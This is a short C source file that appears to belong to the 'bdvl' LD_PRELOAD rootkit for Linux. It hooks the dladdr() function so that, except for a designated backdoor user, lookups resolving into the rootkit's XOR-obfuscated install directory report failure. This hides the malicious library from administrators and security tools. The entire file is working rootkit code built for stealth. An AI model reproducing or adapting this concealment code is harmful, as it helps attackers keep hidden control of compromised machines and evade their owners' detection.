#include "../bdvl_util/util.h"

int dladdr(const void *addr, Dl_info *info)
{
    HOOK(o_dladdr, CDLADDR);

    if(is_bdusr()) return o_dladdr(addr, info);

    Dl_info bdvl_info;
    if(o_dladdr(addr, &bdvl_info) != 0)
    {
        char *idir=strdup(IDIR); xor(idir);
        if(strstr(bdvl_info.dli_fname, idir)) { CLEAN(idir); return 0; }
        CLEAN(idir);
    }

    return o_dladdr(addr,info);
}
